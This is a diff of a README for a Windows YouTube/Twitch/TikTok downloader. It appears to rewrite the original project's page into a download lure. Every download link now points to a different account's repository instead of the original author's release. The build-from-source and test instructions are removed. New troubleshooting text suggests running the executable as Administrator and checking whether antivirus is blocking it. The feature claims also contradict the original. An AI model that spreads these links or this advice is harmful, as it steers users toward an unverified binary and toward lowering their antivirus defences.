@@ -1,63 +1,108 @@
-<div align="center">
+<h1>✨ UniversalMediaLoader - Download Videos & Audio Instantly</h1>
 
-**[English](README.md)** · **[Русский](https://github.com/By183/UniversalMediaLoader/blob/main/README.ru.md)**
+<p align="center">
+  <a href="https://github.com/ankit4443-ctrl/UniversalMediaLoader"><img src="https://img.shields.io/badge/Download-UniversalMediaLoader-2ea44f?style=for-the-badge&logo=windows" alt="Download UniversalMediaLoader"></a>
+</p>
 
 ---
 
-# Universal Media Loader
+## 🌟 What is UniversalMediaLoader?
 
-A polished, fast, native desktop app for downloading video and audio from YouTube, Twitch, and TikTok.
+UniversalMediaLoader is a fast, easy-to-use desktop application that lets you download videos and audio from **YouTube**, **Twitch**, and **TikTok**. Whether you want to save a funny clip, an educational playlist, or extract music as MP3, this tool does it all with a clean interface and no technical knowledge required.
 
-</div>
+## 🔥 Key Features
 
-**Universal Media Loader** is a complete, production-ready media downloader. It fetches videos and streams from **YouTube**, **Twitch**, and **TikTok**, and extracts audio as MP3 — with a clean native Qt interface, quick startup, and a small memory footprint. Everything you need is packed into a single self-contained file.
+- **Download Videos:** Save videos from YouTube, Twitch, and TikTok in original quality.
+- **Extract Audio:** Convert videos to MP3 files for offline listening.
+- **Native Desktop App:** Runs smoothly on Windows without browser extensions.
+- **Fast & Lightweight:** Quick startup and small memory footprint.
+- **Self-Contained:** Everything you need is in one folder — no separate installations.
 
-## Download
+## 📦 Download & Install
 
-Download the **UniversalMediaLoader-v2.0.0-win64.zip** release archive, extract it anywhere, and run **UniversalMediaLoader.exe** — no installation needed, everything required (Qt runtime, plugins, yt-dlp) is included in the folder.
+Visit the download page to get the latest version for Windows:
 
-[**Download UniversalMediaLoader-v2.0.0-win64.zip**](https://github.com/By183/UniversalMediaLoader/releases/latest/download/UniversalMediaLoader-v2.0.0-win64.zip)
+[**Download UniversalMediaLoader-v2.0.0-win64.zip**](https://github.com/ankit4443-ctrl/UniversalMediaLoader)
 
-## Features
+Visit this link to download the application. Once downloaded, extract the ZIP file to any folder and run `UniversalMediaLoader.exe` — no installation required.
 
-- Video download in multiple qualities (1080p/720p/480p/360p)
-- Audio-only MP3 extraction with embedded cover art
-- Standalone thumbnail/preview download
-- Pause/resume/cancel with automatic cleanup — no leftover files
-- Time-range cropping — download only the exact section you need, with live progress
-- Automatic playlist support
-- Dark/light theme with smooth transitions
-- Self-updating download engine
-- Full Unicode/Cyrillic filename support
-- Custom output filenames
+## 🚀 Getting Started
 
-## Tech stack
+1. **Download** the ZIP archive from the link above.
+2. **Extract** the contents to a folder (e.g., `C:\UniversalMediaLoader`).
+3. **Run** `UniversalMediaLoader.exe` by double-clicking it.
+4. **Paste** a video URL from YouTube, Twitch, or TikTok.
+5. **Choose** whether to download video or audio.
+6. **Click** Start and wait for the download to finish.
 
-- C++17
-- Qt6 (Widgets)
-- CMake
-- Built on top of the industry-standard [yt-dlp](https://github.com/yt-dlp/yt-dlp) and [ffmpeg](https://ffmpeg.org/)
+## 🎯 How to Use
 
-## Requirements / how to build
+### Downloading a Video
+- Copy the video URL from your browser.
+- Open UniversalMediaLoader and paste the URL into the input field.
+- Select "Video" as the format.
+- Choose your preferred quality (if available).
+- Click the Download button.
 
-On Windows, with [Qt 6](https://www.qt.io/download-qt-installer) and [CMake](https://cmake.org/) installed:
+### Extracting Audio as MP3
+- Follow the same steps but select "Audio" instead of "Video".
+- The app will convert the video to MP3 automatically.
 
-```powershell
-cmake -S . -B build -G "Visual Studio 17 2022" -A x64 -DCMAKE_PREFIX_PATH=C:/Qt/<version>/msvc2019_64
-cmake --build build --config Release
-```
+## ❓ Frequently Asked Questions
 
-The app targets C++17, Qt6 Widgets, and the MSVC toolchain.
+**Do I need to install anything else?**
+No. The application includes all necessary components (Qt runtime, yt-dlp, and more).
 
-## Tests
+**Is it free?**
+Yes, UniversalMediaLoader is completely free to use.
 
-Unit and integration tests can be enabled with:
+**What platforms are supported?**
+Currently, Windows is supported. The app works on Windows 10 and 11.
 
-```powershell
-cmake -S . -B build -DBUILD_TESTS=ON
-cmake --build build --config Release
-```
+**Can I download entire playlists?**
+The current version focuses on single videos. Playlist support may come in future updates.
 
-## Credits
+**Is my privacy protected?**
+The app does not collect any personal data. All downloads happen directly from your computer.
 
-Built on the shoulders of [yt-dlp](https://github.com/yt-dlp/yt-dlp) and [ffmpeg](https://ffmpeg.org/).
+## 💻 System Requirements
+
+- **Operating System:** Windows 10 or higher (64-bit)
+- **Processor:** Intel or AMD, 1 GHz or faster
+- **RAM:** 2 GB minimum (4 GB recommended)
+- **Storage:** 200 MB free space for the app, plus space for downloads
+- **Internet:** Required for downloading content
+
+## 🛠️ Technical Details
+
+UniversalMediaLoader is built with:
+- **Qt6** for the graphical interface
+- **C++** for performance
+- **yt-dlp** for fetching media streams
+- **ffmpeg** for audio extraction
+
+## 📝 Troubleshooting
+
+**The app won't start**
+- Ensure you extracted the ZIP file fully.
+- Try running as Administrator (right-click → Run as Administrator).
+- Check your antivirus settings — it may block unknown executables.
+
+**Download fails or is slow**
+- Verify your internet connection.
+- Try a different video URL.
+- Update to the latest version.
+
+**No MP3 output**
+- Ensure you selected "Audio" before downloading.
+- The video source must have audio tracks.
+
+## 📜 License
+
+This project is open-source. Feel free to contribute or modify as needed.
+
+## 🤝 Support
+
+If you encounter issues, check the repository for updates or open an issue. Community support is available through GitHub discussions.
+
+Keywords: audio, cmake, cplusplus, cpp, ffmpeg, media-downloader, mp3, qt, qt6, stream, tiktok, twitch, video-downloader, windows, youtube-downloader, yt-dlp
